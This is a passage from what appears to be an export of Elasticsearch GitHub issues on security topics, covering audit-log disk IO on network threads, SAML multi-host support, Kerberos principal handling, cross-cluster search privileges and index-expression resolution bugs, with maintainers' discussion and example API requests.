I would argue that this is a bug and blocking disk IO shouldn't be happening on the network IO thread as it can lead to unpredictable latency. One side effect of this, could be (we observed this once) that the introduced latency blocks the IO thread for long enough to make SSL handshakes fail.
It seems this was indirectly raised in https://github.com/elastic/elasticsearch/issues/34321 but not investigated.

Stacktrace from Yourkit:
[Stacks.txt](https://github.com/elastic/elasticsearch/files/2926906/Stacks.txt)

cc @DaveCTurner @dimitris-athanasiou ","Pinging @elastic/es-securityGood find @original-brownbear !

We haven't taken any precautions about the thread doing the audit write. But we have looked into making sure it is blocking so as to be assured IO errors bubble up if the audit trail cannot be appended.

> It seems this was indirectly raised in #34321 but not investigated.

This issue was raised by Yogesh to investigate if the log4j settings for the audit log flush events after every write. This was the default setting and hence the issue was closed.

> This is especially visible when running large bulk requests (in the test in question a bulk request of size 10k)

https://github.com/elastic/elasticsearch/pull/36245 (7.0 onward, I think) changed auditing for bulk requests, so that every operation comprising the bulk is audited independently, making this problem observable.

As a remediation, I think we should switch from the network thread as soon as possible, just after completing the request and headers read, but I'm guessing there are technical motivations behind the current implementation (keeping authentication and authz on the network thread)...

> As a remediation, I think we should switch from the network thread as soon as possible, just after completing the request and headers read, but I'm guessing there are technical motivations behind the current implementation (keeping authentication and authz on the network thread)...

Yea this is just without alternative imo if you want to write+flush to disk here imo. The motivation to keep things on the network thread is probably just to avoid the context switch and performance penalty that comes with that, but as soon as you start doing things like flushing to disk or any other blocking thing you just have to go to some other thread-pool.> I'm guessing there are technical motivations behind the current implementation (keeping authentication and authz on the network thread)...

I think it was oversight to be honest. Early on in 5.0 we moved everything to a different thread before authc/authz but that was due to the fact that everything was blocking and causing other issues. We can absolutely move this to a different thread. The question becomes which threadpool do we use and should we have limits?@jaymode

> We can absolutely move this to a different thread. The question becomes which threadpool do we use and should we have limits?

Maybe just the `generic` thread pool is fine here? It seems limits are probably not necessarily needed since we get the limiting of the `write` pool in this scenario indirectly anyway?The only concern I have is that in a typical deployment, most requests will have successful authentication using cached credentials, and won't be auditing on `authentication_success`.

If we simply switch to a different thread before authentication, it in effect means that every rest request will incur an unnecessary thread switch (which to the best of my knowledge, we try avoid in the general case).

I don't have a specific alternative, but I'd like us to make sure we're considering what that context switch costs and how we can minimise it.
I think there are a few things that could be done to handle more cases but not necessarily all:

1. No thread switch if auditing is disabled
2. If auditing is enabled and authentication success events are being emitted we switch immediately. I think same goes for access_granted
3. Make auditing methods asynchronous and switch if on a network thread and auditing. Similar to some work done for LDAP by Albert
4. There is also connection granted and denied which we should fork to a new thread to avoid the blocking I/O
5. Custom async logger for auditing only?

The complexity increases as all of these considerations are addedI'm wondering if we can't just switch off of the transport pool for bulk requests in general regardless of the audit logging issue here. I opened https://github.com/elastic/elasticsearch/pull/40866 that does this and added some reasoning for why I think it's ok.Given the discussion in #40866 and the direction that PR is headed, bulk requests have their own cause for moving off of a network thread that is separate from auditing the discussion about what to do for auditing should come back to this issue. @jasontedor suggested using a non blocking queue for audit events. One consideration is that most security conscious users would want a requirement that everything be audited and others would want a failure mode that would prevent a request from executing on audit failure. Another option that might be worth considering is looking at the async logging functionality within log4j2. ",no,">bug,:Security/Audit,Team:Security,"
elastic/elasticsearch,317447319,"AWS IAM Security Realm","*Original comment by @skearns64:*

This issue tracks the creation of an X-Pack Security Realm for LINK REDACTED


",,no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1259956085,"Reload of FileUserPasswdStore does not invalidate lastSuccessfulAuthCache","[Reloading](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/file/FileUserPasswdStore.java#L180-L188) users and passwords in the file realm could potentially introduce new users or update existing.
This means that [lastSuccessfulAuthCache](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/AuthenticationService.java#L97) may not be up to date anymore and would provide suboptimal order of authentication in [RealmsAuthenticator](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/RealmsAuthenticator.java#L322-L342). This is not a big problem since users still have a possibility to use [clear cache API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-cache.html#security-api-clear-request) which would [now clear](https://github.com/elastic/elasticsearch/issues/86650) `lastSuccessfulAuthCache` as well.

Suggestion: We could improve this by registering a listener which would invoke [expireAll](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/AuthenticationService.java#L233-L238) in `AuthenticationService`, when the file realm store gets updated. 

Note: Compared to [the native realm](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/esnative/NativeUsersStore.java#L712-L730), we only need to clear the `lastSuccessfulAuthCache` on the local node.


","Pinging @elastic/es-security (Team:Security)> We could improve this by registering a listener which would invoke [expireAll](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/AuthenticationService.java#L233-L238) in `AuthenticationService`, when the file realm store gets updated.

I think we should explore the possibility to expire individual users instead of `expireAll`. File realm is usually considered as under control of the infrastructure owner which is not necessary the end-users (e.g. ESS). As such, we would want to minimize the impact of infrastructure owner's operations on end-users.This is a good point. I think it should be possible to expire individual users. At the moment I don't see any reason why not. 
We could allow both expireAll and expire individual users to be called and leave it to the implementor to chose which method makes more sense to be called.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,389830774,"Propogate request id to internal actions or add as cause","After #35536, we now have a request id associated with requests. This will follow a request along, but we can lose the request id when the security context is used to switch users (as seen in #36199). This typically happens for an internal action, but for traceability it would be nice to add a caused by request id to these requests. We could even keep the same request id, but that feels a bit odd.  ","Pinging @elastic/es-securityI like the _caused-by_ idea.
I intentionally didn't carry the same request-id into internal actions, because if it wasn't properly understood / processed, it could create some very strange impressions (like the appearance of a user reading from the `.security` index or writing to the audit index).
But having them treated as separate, but related would be very helpful.
I am actually in favor of caring the original `request.id` to internal actions.
I think of the ""request"" in the `request.id` as the original HTTP request and that the id should tie together all handlers in relation to it. Given that this audit `request.id` is synthetic, it can have whatever meaning we assign to it, and we should select the simplest one to reason about, and I think adding a `caused-by` would unnecessary complicate things. For example, isn't the transport action a cause of the rest action or the write a cause of the bulk write - it's hard to say in words when something is a cause of something else or when they're both the same thing? Also, note that the user changes for internal actions, and this is reflected in log record,  so there should not be any confusion that some user is accessing the `.security` index directly.",no,":Security/Audit,team-discuss,Team:Security,"
elastic/elasticsearch,317449524,"Remove duplicated code between NativeRealmMigrator and NativeUsersStore","*Original comment by @jaymode:*

As part of LINK REDACTED, some duplicate code dealing with the storage format of native users was added to the NativeRealmMigrator. @tvernum suggested adding a stateless class to avoid this. The amount of duplication is currently minimal so the need for this cleanup is low, but it would be nice to do.

",,no,">non-issue,:Security/Security,Team:Security,"
elastic/elasticsearch,672347096,"AD Kerberos auth on HDFS Repo uses sAMAccountName on Java 14","When running HDFS Repository on the packaged Java 14 distribution, authentications against Active Directory's Kerberos server will change the original principal name to that principal's sAMAccountName. This seems to be due to a JDK bug introduced in Java 13 [JDK-8215032](https://bugs.openjdk.java.net/browse/JDK-8215032) which was previously reported and should be fixed in Java 15 [JDK-8239385](https://bugs.openjdk.java.net/browse/JDK-8239385) (backported to 11.0.2, and 8u241).

Creating or validating an HDFS Repository secured against AD on this version of Java can produce this error response:
```json
{
  ""error"":{
    ""root_cause"":[
      {
        ""type"":""unchecked_i_o_exception"",
        ""reason"":""unchecked_i_o_exception: Cannot create HDFS repository for uri [hdfs://namenode.uri]""
      }
    ],
    ""type"":""repository_exception"",
    ""reason"":""[node] cannot create blob store"",
    ""caused_by"":{
      ""type"":""unchecked_i_o_exception"",
      ""reason"":""unchecked_i_o_exception: Cannot create HDFS repository for uri [hdfs://namenode.uri]"",
      ""caused_by"":{
        ""type"":""i_o_exception"",
        ""reason"":""User: $XXXXXX-XXXXXXXXXXXX@FQDN.REALM is not allowed to impersonate elasticsearch/HOST@FQDN.REALM""
      }
    }
  },
  ""status"":500
}
```

Enabling krb5 debugging log reveals that Elasticsearch kerberos client performs login against AD Kerberos server and receives an updated principal:
```
[INFO ][stdout                   ] [node] Found ticket for $XXXXXX-XXXXXXXXXXXX@FQDN.REALM to go to krbtgt/FQDN.REALM@FQDN.REALM expiring on <expiration date>
...
[INFO ][stdout                   ] [node] >>> DEBUG: ----Credentials----
[INFO ][stdout                   ] [node] 	client: $XXXXXX-XXXXXXXXXXXX@FQDN.REALM
[INFO ][stdout                   ] [node] 	client alias: elasticsearch/HOST@FQDN.REALM
[INFO ][stdout                   ] [node] 	server: nn/namenode.uri@FQDN.REALM
[INFO ][stdout                   ] [node] 	ticket: sname: nn/namenode.uri@FQDN.REALM
```
This updated principal is the sAMAccountName for the associated principal in Active Directory. The original principal name is persisted as an alias for the principal. Hadoop uses this alias field to support user impersonation, which causes the first authentication attempt to Namenode to fail with the above message, as Namenode is not configured to accept impersonation requests from a principal with the sAMAccountName as the original.

Current Workarounds: Downgrading to a Java 11 version (before 11.0.6 or 11.0.9 and up) should resolve the issue, allowing for the client to correctly resolve the principal during the authentication request.","Pinging @elastic/es-core-infra (:Core/Infra/Packaging)Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-distributed (:Distributed/Snapshot/Restore)Does this require any action on our end, or just wait for newer JDK? Do we have a testing gap here?Personally, I feel like it falls into a ""known issues"" sort of category, with the understanding that when we upgrade to a newer JDK it will no longer be a problem. Though, I wonder if this might be considered an issue with our Kerberos authentication realm as well? Not on the server side, but on the client side?",no,">bug,:Delivery/Packaging,:Distributed/Snapshot/Restore,:Security/Authentication,Team:Distributed,Team:Security,Team:Delivery,"
elastic/elasticsearch,949281127,"Support SAML authentication for applications multiple URLs (hostname aliases)","_Note: I will write about ""Kibana"" because that is our primary SAML application, however everything written below applies to other applications as well._

Currently each SAML realm supports a single ACS with a single hostname. If Kibana is available on multiple URLs (most often multiple DNS entries pointing to the same hosts) then it is not currently possible to configure a single SAML realm that can service both of those URLs.

It is possible to configure multiple SAML realms, but then the issue is that we don't have a good process to select which realm to use to authenticate - We can list 2 realms on the Kibana login selector, but the explanatory text would need to try and explain _""Use this option if your browser address bar says xyz.host""_ which is clearly not reasonable.

One option (though there are others would be)
1. Allow a single SAML realm to be configured with ""alternate hosts"". This could look something like:
   ```
   xpack.security.authc.realms.saml.corp_sso:
      sp.entity_id: ""https://my.kibana.host/""
      sp.acs: ""https://my.kibana.host/api/security/saml/callback""
      idp.metadata.path: saml/idp-metadata.xml
      idp.entity_id: ""https://sso.example.com/""
      alternate_hosts: [ ""other.kibana.host"" ]
   ```
2. Allow Kibana to pass through a hostname on applicable SAML APIs, and if that is an alternate host use it in place of the hostname in the ACS or logout URL.
3. Likewise when validating SAML messages from the IdP, accept any ""alternate_host"" in place of the primary host.

That option would assume that the IdP allows multiple ACS URLs for the same entity id.

We _could_ support different EntityIDs per alternate host, if we think that is needed, for example:
```
xpack.security.authc.realms.saml.corp_sso:
   sp.entity_id: ""https://my.kibana.host/""
   sp.acs: ""https://my.kibana.host/api/security/saml/callback""
   idp.metadata.path: saml/idp-metadata.xml
   idp.entity_id: ""https://sso.example.com/""
   alternatives: 
      - host: other.kibana.host
         entity_id: ""https://other.kibana.host/"" 
``` 
 
An alternative option would be to force Kibana to redirect to a canonical URL as part of the SAML flow. One way to do that would be for the SAML prepare authc API to return a ""hostname"" (taken from the ACS URL) and if Kibana is not using that hostname, then it redirects to that host before setting the SAML cookie and bouncing the user to the IdP.  
","Pinging @elastic/es-security (Team:Security)CC: @elastic/kibana-security > It is possible to configure multiple SAML realms, but then the issue is that we don't have a good process to select which realm to use to authenticate - We can list 2 realms on the Kibana login selector, but the explanatory text would need to try and explain ""Use this option if your browser address bar says xyz.host"" which is clearly not reasonable.

If I'm not missing anything, we can also try to handle this purely in Kibana (assuming only supporting Kibana is enough). For example, we can introduce a new optional `host` configuration property for SAML provider (or for all providers):

```yaml
xpack.security.authc.providers:
  basic.global-basic:
    order: 0
  saml.corp-saml:
    order: 1
    realm: main-saml
    host: ""corp.com""
  saml.cname-corp-saml:
    order: 2
    realm: cname-saml-cname
    host: ""cname-corp.com""
```

* If Login Selector is enabled, it will only display providers with the matching `host` or without it (""global"" options)
* If Login Selector is not enabled, Kibana still does an additional redirect to a special client-side page that captures current URL fragment before preparing SAML request. We can also capture the current host there (or we can just rely on the `Host` HTTP header?) and then pick the right SAML provider/realm to prepare a SAML request
* During IdP initiated login Kibana already loops through SAML providers (and hence SAML realms) sorted by `order` until it finds the one that can handle SAML response

We'll still need to think what to do when Kibana is configured with a specific `server.publicBaseUrl` and users will have a bit more involved configuration on both ES and Kibana ends, but everything else sounds doable.> If I'm not missing anything, we can also try to handle this purely in Kibana (assuming only supporting Kibana is enough). For example, we can introduce a new optional `host` configuration property for SAML provider (or for all providers):

I like this approach. It would double as a feature that some customers have asked for (to reduce confusion for their users who don't know what provider to pick).

I opened an issue for it in elastic/kibana#109525 if you want to add anything to it.

",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,679885289,"Reduce error logging from security during node startup","There are places (e.g. [`NativeUsersStore`](https://github.com/elastic/elasticsearch/blob/v7.8.1/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/esnative/NativeUsersStore.java#L198-L203)) where we log a message at `ERROR` level if the security index exists, but is unavailable.

During normal operation, that's a reasonable things to treat as an error. However, during node/cluster startup, it is normal for the security index to exist, but not yet be recovered. In those cases the `ERROR` message is extreme and leads to confusions - admins may treat this as a sign of a cluster problem, when it is in fact a normal operation.

We should log something - the admin should be informed at authc is failing because the cluster hasn't fully recovered yet - but the message should reflect ""cluster is still starting up, cannot authenticate against native realm"".
 
The native users store is not the only example of this, but it's the main one.","Pinging @elastic/es-security (:Security/Security)Hi!

I have several questions related to this issue.

First, is `frozenSecurityIndex.isStateRecovered() == true` a good check that the node / cluster is fully recovered and it's not during startup?

Second, is every `frozenSecurityIndex.isAvailable() == false` without the ""full recovery"" check an example of this? Meaning, should we also check [here](https://github.com/elastic/elasticsearch/blob/b5ca9c58fb664ca8bf9e4057fc229b3396bf3a89/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L469)?",no,">bug,help wanted,:Security/Security,Team:Security,"
elastic/elasticsearch,733644221,"Possibly enable AES GCM ciphers by default in jdk8 ","Supersedes https://github.com/elastic/elasticsearch/issues/29695

Opening this for consideration since I closed #29695 ",,no,">non-issue,:Security/TLS,"
elastic/elasticsearch,644404702,"Review read_cross_cluster privilege","The read_cross_cluster privilege is not required when performing cross-cluster searches and roundtrips are minimized, as the coordinating node sends search requests straight to each remote cluster, rather than a cluster search shards to resolve the shards and then shard level search requests to each shard involved.

Users would expect the read cross cluster privilege to always have the same effect on cross cluster searches, regardless of the execution mode and internal optimizations. What can be done to address this?","Pinging @elastic/es-security (:Security/Authorization)The `read_cross_cluster` privilege grants access to following actions:
1. `internal:transport/proxy/indices:data/read/*`
2. `indices:admin/shards/search_shards`

**Item 1** is nothing but what the `read` privilege grants except they are wrapped inside a proxy. These actions do not expose any more information/data than the `read` privilege. The only difference is where the actions come from. I don't think we intend to authorize based on how the requests are issued (operator privilege will likely be an exception to this, but the use case is quite different). If the data is accessible to an user via one action, there is little reason why we should block the same data when it is requested via another action. This is a similar argument to the decision made for data stream and backing indices. In this case, it is not really another action, just a proxy. Hence I suggest we merge these actions into the `read` privilege. We can probably move one step further: do not wrap any `indices:data/read/*` actions, i.e. completely retire `internal:transport/proxy/indices:data/read/*` actions. This way, cross cluster read actions are just normal read actions.

**Item 2** is not covered by the `read` privilege and it should **not** be, since it is a metadata level information which we may not want to grant to normal search users. Depending on the query parameters, CCS switches between two modes and one of them requires this additional privilege. To me, this switching and its privilege difference feel like implementation details. Hence I suggest we perform this [particular request](https://github.com/elastic/elasticsearch/blob/fc19689febac81903fc6863bb1541cff40268c1c/server/src/main/java/org/elasticsearch/action/search/TransportSearchAction.java#L371) using system user to avoid asking for additional privileges from end-users. This is not without precedence, e.g. `stashWithOrigin`. 

In summary, I suggest we deprecate `read_cross_cluster` privilege. I do realise this means that there are no additional privileges to control ccs. I personally think it is fine mainly because ccs does not expose any more information than what's already provided by `read`. 

If we do wanna have control on ccs, I think it is a bigger topic on how cross-cluster security should be managed than just ccs. With the current authorization and cross-cluster model, a local authentication is almost fully trusted by the remote cluster. It does require the roles to be resolvable on the remote cluster. But this requirement is rather minimal because: 1) `superuser` is always resolvable; 2) API key roles are fully embedded and always resolvable. So it is unlikely the remote cluster can protect itself against malicious users if the local cluster is compromised, i.e. `read_cross_cluster` does not really provide practical security protection. So assuming local cluster is **not** compromised, are there any real valid use cases for treating search permissions differently based on which cluster the same user is logged in?

With above being said, if people do feel strong that we should keep `read_cross_cluster`, a possible fix to modified `RemoteClusterAwareClient` to always wrap search actions with `internal:transport/proxy/` so that they are checked by `read_cross_cluster`.One thing I need to amend: I think I was wrong saying that read_cross_cluster is not needed when minimizing round-trips. The proxy actions still need to be authorized.> One thing I need to amend: I think I was wrong saying that read_cross_cluster is not needed when minimizing round-trips. The proxy actions still need to be authorized.

This is not how I understand it. The proxy actions are **not** used when ""minimizing round-trips"" is in effect, e.g. a ccs search request like:
```
GET one:test/_search?ccs_minimize_roundtrips=true
``` 
does not need any permission from `read_cross_cluster`. Since `ccs_minimize_roundtrips=true` is default, this is to say:
```
GET one:test/_search
``` 
does not need `read_cross_cluster` privilege, which is the confusion that customer had in the SDH that led to this issue. 

There are many ways to opt-out ""round-trip minimization"":
* Explicity set `ccs_minimize_roundtrips` to `false`
* Set `search_type` to `dfs_query_then_fetch`
* Use scroll
* Request for Field collapse
* Request for Inner hits

There maybe other ways as well. For these use cases, `read_cross_cluster` is indeed required. But it is correct to say that ""`read_cross_cluster` is **not** always needed. Some cross-cluster searches do not require it and that ""some"" covers the default configuation (`ccs_minimize_roundtrips=true`).> I suggest we perform this particular request using system user to avoid asking for additional privileges from end-users.

I don't think we would want to do that - the search _is_ the thing that the end user is requesting, and should respect their privileges.
For example, I don't see how we could implement DLS & FLS if we ran the search as a system user.> > I suggest we perform this particular request using system user to avoid asking for additional privileges from end-users.
> 
> I don't think we would want to do that - the search _is_ the thing that the end user is requesting, and should respect their privileges.
> For example, I don't see how we could implement DLS & FLS if we ran the search as a system user.

The `search_shards` action does not perform the actual search, it is a preflight to gather information about remote nodes and shards to help things like `dfs_query_then_fetch`. Unless I am misunderstanding what it does, this feels like an implementation detail since ES tries to pretend remote shards as being local. When it happens, the actual search has not started yet. I don't quite see how it should be tied to user privileges.@ywangd I was not clear, what I meant is that the proxy actions still need to be authorized on the remote cluster, so read_cross_cluster is required on the remote side at all time, while it isn't on the coordinating node/cluster when roundtrips are minimized (though it is hard to define when roundtrips are minimized hence the roles should still be required on the coordinating side too). With this in mind, I wonder if any change is needed. Please let me know if this makes sense to you.@javanna I think I understand what you mean. But I don't think it is correct, specifically
> read_cross_cluster is required on the remote side at all time
>
When roundtrips are minimized, `read_cross_cluster` is **not** required on the _remote_ side because the local node does not wrap actions with proxy. 

For the local node, an user never really needs any privilege, that is, neither `read` nor `read_cross_cluster` is needed. It simply requires the user to have a role that has the same _name_ as the one used in the romote cluster. It is really just about the name, the role does not even need to exist on the local node.

As an concrete example:

**Local Node**
 * Configure ccs as 
```
PUT /_cluster/settings
{
  ""persistent"": {
    ""cluster"": {
      ""remote"": {
        ""one"": {
          ""mode"": ""proxy"",
          ""proxy_address"": ""...remote_node_address...""
        }
      }
    }
  }
}
```
* Create an user 
```
PUT /_security/user/bar
{""password"": ""password"", ""roles"": ['test_read']}
```
*Note* we do not need create the `test_read` role, the name itself is sufficient.

**Remote Node**
* Create the same user
```
PUT /_security/user/bar
{""password"": ""password"", ""roles"": ['test_read']}
```
* We also need create the role as
```
PUT /_security/role/test_read
{""indices"": [{""names"": [""test""], ""privileges"": [""read""]}]}
```
*Note* the role does *not* have `read_cross_cluster`.

**CCS**
Now assume there is an index `test` on the remote node, the `bar` user can perform ccs from the local node with
```
GET one:test/_search
```
And it will work.

However, if the above search is issued by explicity disable roundtrip minimization
```
GET one:test/_search?ccs_minimize_roundtrips=false
```
It will fail with error 403.

I hope this makes sense. Please let me know if anything does not look right to you.CCS with async search is another variant of this issue (thanks to @javanna for the prompt). The current code explicitly disables roundtrip minimization:
https://github.com/elastic/elasticsearch/blob/0f256948a5176ac4baab0a217e1107c0f86063a5/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/search/action/SubmitAsyncSearchRequest.java#L49-L55

This means CCS async search always required `read_cross_cluster` privilege on the remote cluster. Here is a brief summary on the need of `read_cross_cluster` privilege:
* Regular CCS with roundtrip minimisation **enabled** - **No**
* Regular CCS with roundtrip minimisation **disabled** - **Yes**
* Async CCS - **Yes**

After team discussion, we have agreed that:
* Actions granted by `read_cross_cluster` are implementation details. They can either be merged into `read` or performed with system user.
* We recognise the need for access control of remote users. Currently the roles brought across by a remote user is fully trusted by the local clusters, e.g. a `superuser` in the remote cluster is a `superuser` in the local cluster. It would be useful for local clusters to be able to somehow sandbox the remote users. It is however a much bigger scope of work and should not be tied to or solved by this particular issue.
* The `read_cross_cluster` deprecated and ultimately dropped. We plan to deprecate it in v8.0.We have found similar issues in transform, see #72715.

In transform we also need the `view_index_metadata` privilege on the remote. That means we would also need a `view_index_metadata_cross_cluster` to be consistent. That doesn't sound like a good idea to me. To me it seems more useful to define whether _any_ read operation, _any_ access is allowed from remote. This could be 1 ""cross cluster"" privilege instead of 1 per ""index"" privilege, maybe that's the idea, in this case however, `read_cross_cluster` is not a good name.
@hendrikmuhs Thanks for additional context from transform's perspective. 

I feel there may be some misunderstanding on what `read_cross_cluster` does and the proposed changes. IIUC, its issue is different from the one from #72715. The tentative proposal here is to deprecate the `read_cross_cluster ` privilege and simply let `read` to cover the need of CCS. This is because we consider the actions coverd by the `read_cross_cluster` privilege to be implementation details. For example, `ClusterSearchShardsAction` is a preflight request to gather shard information before the actual data read. That is, users do not need `read_cross_cluster` for the step of reading data on the remote cluster. They need it because it is required by steps piror to the read and we consider these prior steps implementation details.

Also, if a cross-cluster search request targets only remote indices, the user does **not** need any privileges on the local cluster. That is, the `read` and `read_cross_cluster` privileges are checked only on the remote cluster. However, base on your comments on #72175, put/update transform checks `view_index_metadata` on both local and remote clusters (with the default `defer_validation=false`). This is non-ideal.

IIUC, the reason is that Transform code actively checks the privilege with the hasPrivileges API, which forces privilege check on both clusters even when the source index could be remote only. On the contrary, CCS search is authorized by `RBACEngine` and `IndicesAndAliasesResolver`, which handles pure remote indices correctly by not requiring any privileges on the local cluster. In addition, it seems (correct me if I am wrong) Transform requires index privileges to be granted with explicit remote cluster prefix. For example, to add the following transform:
```javascript
PUT _transform/t1
{
  ""source"": {
    ""index"": ""remote:source""
  },
  ""latest"": {
    ""unique_key"": ""foo.keyword"",
    ""sort"": ""foo.keyword""
  },
  ""dest"": {
    ""index"": ""target""
  }
}
```
The user would need following role definitions:
```javascript
// On the local cluster
PUT _security/role/transform_role
{
  ""indices"": [
    {
      ""names"": [
        ""remote:source""  // <--- remote:source instead of just source
      ],
      ""privileges"": [""read"", ""view_index_metadata""]
    },
    {
      ""names"": [""target""],
      ""privileges"": [""read"", ""index"", ""create_index""]
    }
  ]
}

// On the remote cluster
PUT _security/role/transform_role
{
  ""indices"": [
    {
      ""names"": [
        ""source""
      ],
      ""privileges"": [""read"", ""view_index_metadata""]
    }
  ]
}
```
Note the index is listed as `remote:source` instead of just `source`. This is technically wrong because ES's RBAC model does not support granting privileges over remote indices directly. The hasPrivileges API is also not designed to work with remote indices (we have an issue for it #67798).

**Overall**, if we apply the same logic of how we evaluate cross-cluster search to `view_index_metadata`, I'd suggest Transform to:
1. *Not* creating a `view_index_metadata_cross_cluster` privilege
2. Just let `view_index_metadata` to cover the privilege required by the remote indices
3. Do _not_ check `view_index_metadata` locally if source index is remote only.
4. Do _not_ prefix index names with remote cluster name when granting privileges

For the above example, this means the following role definitions
```javascript
// On the local/target cluster
PUT _security/role/transform_role
{
  ""indices"": [
    {
      ""names"": [""target""],
      ""privileges"": [""read"", ""index"", ""create_index""]
    }
  ]
}

// On the remote/source cluster
PUT _security/role/transform_role
{
  ""indices"": [
    {
      ""names"": [""source""],
      ""privileges"": [""read"", ""view_index_metadata""]
    }
  ]
}
```

To support it, we need the hasPrivileges API to be remote indices aware. However, we (es-security) are also unsure about ES code relying on the hasPrivileges API. It was original designed for Kibana specifically, or more broadly, for external integrations. But since then we have seen it being used in other parts of ES, e.g. async search. This is something we want to re-evaulate because it can lead to discrepancies in terms of authorization results compared to going through the authc/authz workflow (as can be seen in Transform's usage of it). 

I hope this makes sense. I am happy to chat further if needed. Thanks!Thanks @ywangd, I think you misunderstood me:

> its issue is different from the one from #72715. 

I haven't claimed it, #72715 is tracked on its own. As described in https://github.com/elastic/elasticsearch/issues/72715#issuecomment-832769999 this is a _transform_ issue. Specifying a privilege for the remote on the local cluster is wrong (as you said, too). 

(FWIW: this [PR](https://github.com/elastic/elasticsearch/pull/72816) updates the current required workaround, but the `my_remote` definitions will be removed with the resolution of #72715 (or #67798))

> The tentative proposal here is to deprecate the `read_cross_cluster ` privilege and simply let `read` to cover the need of CCS.

Sounds good, I suggest to update the issue title and maybe description. I think this is the root of  confusion here. Note that the [documentation](https://www.elastic.co/guide/en/elasticsearch/reference/master/security-privileges.html) states `read_cross_cluster` is required for _any_ searches on a remote cluster:

```
read_cross_cluster | Read-only access to the search action from a remote cluster.
```

It would be nice to improve the documentation and clarify in which cases `read_cross_cluster` is required.

>     1. _Not_ creating a `view_index_metadata_cross_cluster` privilege

There are no plans to introduce new privileges as part of #72715. What I said: `read_cross_cluster` is inconsistent, however removing `read_cross_cluster` seems to be the way forward.

> The hasPrivileges API is also not designed to work with remote indices (we have an issue for it #67798).

This is useful! If #67798 gets fixed, there is nothing to do for #72715 (apart from fixing the rest test case). Transform only passes the user supplied configuration, which at the moment does not make a difference between local and remote.

Any plans to fix #67798 for `7.14`?
To fix #72715 we would otherwise implement a workaround, but that's superfluous once `_has_privileges` understands remotes.> I suggest to update the issue title and maybe description. I think this is the root of confusion here. 

I raised #72906 for deprecating `read_cross_cluster` privilege. This issue is for reviewing the privilege and has served its purpose. Now that we have reached the conclusion, I intend to close this issue after confirming with the team (es-security). Should have done this a while back but got distracted by other priorities. Thanks for raising the awareness.

> Note that the documentation states read_cross_cluster is required for any searches on a remote cluster

True. The documentation needs to be updated. It's no longer accurate since we support roundtrip minimization (a while back). Now it should be updated as part of the deprecation.

> Any plans to fix #67798 for 7.14?

Not entirely clear yet. It's been put on hold due to other priorities. I can bring it up again in the team meeting this week and report back.",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,480139292,"Empty index name in `index` path param fails request with access denied","When doing index operations like `_search`, `_field_caps` we provide index patterns as a path param. When security is enabled and the index pattern path param contains an empty string then the request fails with HTTP status 403 and a `security_exception` with message `action [indices:data/read/search] is unauthorized for user [elastic]`. The user has `superuser` role but the root cause is a string out of bounds exception with message `String index out of range: 0`.

IMO we should not be throwing index out of bounds exception during index alias resolution and the response should be a validation error instead of access denied similar to what we respond when security is disabled.

Example problem invocation with a empty string as index name:
`POST /test*,,missing*/_search?q=*`
`GET /test*,,missing*/_field_caps`

When security is disabled, the response is with HTTP status 404 and an `index_not_found_exception` with message `no such index []`.","Pinging @elastic/es-securityThere are request options which describe how a missing index should be handled. However, in this case, the empty string index name should be ignored irrespective of those (I believe this is the behavior without Security, which we should always try to replicate).

_I was going to ask if you're planning to work on it, but then I saw you labeled it team-discuss._I don't remember what we decided when we discussed this.

But I took another look at the code, and given that empty index names are invalid (cannot create such an index), I think we should always return 404 (missing index) for expressions containing such an index. I think we should not pass it along, through the security action filter, because we could expose ourselves to bugs in core that might confuse expressions containing empty index names with expressions with no indices which usually is translated to `all`.We discussed this inside the team, and we converged on being cautious and reject invalid index expressions soonest, in the Security layer. It is on me to investigate exactly and raise a PR which I will do asap.",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1208887714,"Multi-target syntax bug with datastream backing indices and excluded targets","### Elasticsearch Version

8.3.0-SNAPSHOT / ""build_hash"" : ""dea288efdccb144b9002949368cc8c3fee004b96""

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Darwin galactic.localdomain 21.4.0 Darwin Kernel Version 21.4.0: Fri Mar 18 00:45:05 PDT 2022; root:xnu-8020.101.4~15/RELEASE_X86_64 x86_64

### Problem Description

Some datastream and index name expressions don't resolve as expected when security is enabled.

### Steps to Reproduce

```
# create a datastream

PUT _index_template/test-logs-data-stream
{
  ""index_patterns"": [ ""test-logs-*"" ],
  ""data_stream"": { },
  ""template"": {
    ""settings"" : {
      ""index"": {
        ""refresh_interval"": ""1s""
      },
      ""number_of_shards"": 1,
      ""number_of_replicas"": 0
    }
  }
}

PUT _data_stream/test-logs-1

# observe that there is one index, and that it's the one for the datastream

GET _cat/indices?s=index
```

```
# as expected, these each return the field caps for the _id field for the one index

GET test-logs*/_field_caps?fields=_id

GET .ds-test-logs*/_field_caps?fields=_id
```

```
# as expected, these expressions return 0 results

# expect 0 results, get 0 results, good
GET test-logs*,-test-logs*/_field_caps?fields=_id

# expect 0 results, get 0 results, also good
GET .ds-test-logs*,-.ds-test-logs*/_field_caps?fields=_id
```

```
# but here's the bug, these two don't return 0 results

# expect 0 results, get 1 results, bad
GET .ds-test-logs*,-test-logs*/_field_caps?fields=_id

# expect 0 results, get 1 results, also bad
GET test-logs*,-.ds-test-logs*/_field_caps?fields=_id
```

